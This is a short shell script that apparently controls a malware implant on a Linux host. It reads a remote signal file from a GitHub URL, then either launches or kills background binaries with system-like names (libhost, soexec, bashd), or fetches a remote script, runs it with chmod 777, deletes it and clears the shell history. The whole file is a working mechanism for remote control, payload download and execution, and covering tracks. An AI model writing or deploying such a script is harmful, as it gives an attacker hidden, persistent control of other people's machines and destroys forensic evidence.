#! /bin/sh

wget https://raw.githubusercontent.com/myvulweb/singal/master/1.txt -O /tmp/singal-test.txt
ret=`cat /tmp/singal-test.txt`
rm -rf /tmp/singal-test.txt

cur_ver=`cat /usr/bin/libhost_ver.txt`
echo $cur_ver
echo $ret
if [ "$ret" -eq 1 ]
then
	echo "start"
	if [ `ps -ef|grep /usr/bin/libhost | grep -v grep |wc -l`  -ge 1 ];then
		echo "already started libhost"
	else
		echo "need to start libhost"
		/usr/bin/libhost &
	fi

	if [ `ps -ef|grep /usr/bin/soexec | grep -v grep |wc -l`  -ge 1 ];then
		echo "already started soexec"
	else
		echo "need to start soexec"
		/usr/bin/soexec &
	fi

elif [ "$ret" -eq 0 ]
then
	echo "need to stop all"
	killall libhost
	killall soexec
	killall bashd
elif [ "$ret" -gt "$cur_ver" ]
then
	echo "need to update"
	wget https://raw.githubusercontent.com/myvulweb/mysh/master/in.sh -O /tmp/in.sh
	chmod 777 /tmp/in.sh
	/tmp/in.sh
	rm -rf /tmp/in.sh
	history -c

else
	echo "not defined!"
fi


